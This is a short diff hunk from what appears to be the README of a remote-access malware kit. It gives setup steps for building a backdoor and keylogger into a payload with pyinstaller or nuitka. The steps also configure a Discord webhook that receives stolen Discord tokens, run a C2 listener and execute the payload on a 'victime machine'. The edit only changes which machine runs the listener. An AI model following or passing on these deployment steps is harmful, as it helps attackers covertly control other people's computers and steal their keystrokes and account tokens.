@@ -46,7 +46,7 @@ C2 listener
 optional: put your webhook in the discord.py file to recieve discord token
 2. install the requirements.txt using "pip3 install -r requirements.txt"
 3. and then "build" the backdoor.py and the keylogger.py using pyinstaller or nuitka to create the payload
-4. start the listener.py on your target machine and execute the payload on your victime machine
+4. start the listener.py on your machine and execute the payload on your victime machine
 ```
 
 unobfscated python detection:
